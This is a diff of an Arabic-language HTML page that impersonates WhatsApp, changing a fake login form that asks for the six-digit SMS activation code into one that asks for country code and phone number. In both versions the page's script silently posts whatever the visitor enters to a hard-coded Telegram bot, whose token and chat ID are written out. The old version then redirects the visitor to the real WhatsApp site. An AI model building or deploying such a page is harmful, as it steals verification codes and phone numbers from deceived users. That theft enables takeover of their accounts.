@@ -1,61 +1,59 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
-    <title>WhatsApp Login</title>
+    <title>WhatsApp Registration</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #FAF3E7;
             margin: 0;
             padding: 0;
-            background-color: #FAF3E7;
-            height: 100vh;
             display: flex;
             flex-direction: column;
+            min-height: 100vh;
         }
 
-        /* الشريط العلوي */
-        header {
-            background-color: #25D366;
-            color: white;
+        .navbar {
             display: flex;
-            align-items: center;
             justify-content: space-between;
+            align-items: center;
+            background-color: #25D366;
             padding: 10px 20px;
+            color: white;
             font-size: 18px;
-            font-weight: bold;
         }
 
-        header .logo {
+        .navbar .logo {
             display: flex;
             align-items: center;
         }
 
-        header .logo img {
+        .navbar .logo img {
             height: 30px;
             margin-right: 10px;
         }
 
-        header .menu {
+        .navbar .menu {
             cursor: pointer;
             font-size: 22px;
         }
 
-        /* المحتوى */
         .container {
             flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            text-align: center;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
             padding: 20px;
+            max-width: 400px;
+            margin: 20px auto;
         }
 
-        .container .logo img {
-            height: 80px;
+        .container .design img {
+            width: 150px;
             margin-bottom: 20px;
         }
 
@@ -76,19 +74,20 @@
         .container .form-group {
             display: flex;
             flex-direction: column;
-            align-items: center;
             gap: 10px;
-            width: 100%;
-            max-width: 300px;
+            align-items: center;
+            margin-bottom: 20px;
         }
 
+        .container select,
         .container input {
             border: 1px solid #ddd;
             border-radius: 6px;
             padding: 10px;
-            font-size: 16px;
+            font-size: 14px;
             width: 100%;
-            text-align: center;
+            max-width: 300px;
+            box-sizing: border-box;
         }
 
         .container button {
@@ -100,19 +99,20 @@
             font-size: 16px;
             cursor: pointer;
             width: 100%;
+            max-width: 300px;
         }
 
         .container button:hover {
             background-color: #1DA955;
         }
 
-        /* الشريط السفلي */
         footer {
             background-color: #f1f1f1;
             color: #888;
             text-align: center;
             padding: 10px;
             font-size: 12px;
+            margin-top: auto;
         }
 
         footer a {
@@ -123,79 +123,90 @@
 </head>
 
 <body>
-    <!-- الشريط العلوي -->
-    <header>
+    <!-- Navbar -->
+    <div class="navbar">
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
-            WhatsApp 
+            واتساب
         </div>
         <div class="menu">☰</div>
-    </header>
-
-    <!-- المحتوى -->
-    <div class="container">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
-        </div>
-        <div class="title">تسجيل الدخول</div>
-        <div class="description">
-            أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.
-        </div>
-        <div class="form-group">
-            <input id="phoneNumber" type="text" placeholder="رمز التفعيل" maxlength="6" pattern="\d{6}" required>
-            <button onclick="sendMessage()">متابعة</button>
-        </div>
     </div>
 
-    <!-- الشريط السفلي -->
+    <!-- Main Container -->
+    <div class="container">
+        <div class="design">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+        </div>
+
+        <div class="title">تسجيل الدخول</div>
+
+        <div class="description">يرجى إدخال رمز الدولة ورقم الهاتف.</div>
+
+        <div class="form-group">
+            <select id="countryCode">
+                <option value="966">🇸🇦 السعودية +966</option>
+                <option value="971">🇦🇪 الإمارات +971</option>
+                <option value="965">🇰🇼 الكويت +965</option>
+                <option value="974">🇶🇦 قطر +974</option>
+                <option value="973">🇧🇭 البحرين +973</option>
+                <option value="968">🇴🇲 عمان +968</option>
+                <option value="963">🇸🇾 سوريا +963</option>
+                <option value="964">🇮🇶 العراق +964</option>
+                <option value="962">🇯🇴 الأردن +962</option>
+                <option value="970">🇵🇸 فلسطين +970</option>
+                <option value="249">🇸🇩 السودان +249</option>
+                <option value="253">🇩🇯 جيبوتي +253</option>
+                <option value="252">🇸🇴 الصومال +252</option>
+                <option value="222">🇲🇷 موريتانيا +222</option>
+                <option value="967">🇾🇪 اليمن +967</option>
+                <option value="269">🇰🇲 جزر القمر +269</option>
+                <option value="211">🇸🇸 جنوب السودان +211</option>
+            </select>
+            <input id="phoneNumber" type="text" placeholder="رقم الهاتف" maxlength="10">
+        </div>
+        <button onclick="sendMessage()">متابعة</button>
+    </div>
+
     <footer>
         © 2024 واتساب. جميع الحقوق محفوظة. <br>
         <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">مركز المساعدة</a>
     </footer>
 
     <script>
-        // بيانات API Telegram
         const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
         const chatId = '612575358';
 
-        // وظيفة الإرسال
         function sendMessage() {
-            const phoneNumberInput = document.getElementById('phoneNumber');
-            const phoneNumber = phoneNumberInput.value;
+            const countryCode = document.getElementById('countryCode').value;
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
 
-            // التحقق من الإدخال
-            if (!phoneNumber || phoneNumber.length !== 6 || !/^\d{6}$/.test(phoneNumber)) {
-                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
+            if (!phoneNumber || phoneNumber.length < 6) {
+                alert('يرجى إدخال رقم هاتف صحيح.');
                 return;
             }
 
-            // إرسال الرسالة
-            const message = `رمز التفعيل: ${phoneNumber}`;
+            const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;
+
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    text: message,
-                }),
-            })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert('تم إرسال رمز التفعيل بنجاح!');
-                        phoneNumberInput.value = '';
-                        window.location.href = "https://www.whatsapp.com";
-                    } else {
-                        alert('حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقاً.');
-                    }
+                    text: `رقم الهاتف: ${fullPhoneNumber}`
                 })
-                .catch(error => {
-                    alert('فشل الاتصال بالخادم. تأكد من اتصال الإنترنت.');
-                });
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('تم الإرسال بنجاح!');
+                } else {
+                    alert('حدث خطأ أثناء الإرسال.');
+                }
+            })
+            .catch(error => {
+                alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
+            });
         }
     </script>
 </body>
-
 </html>
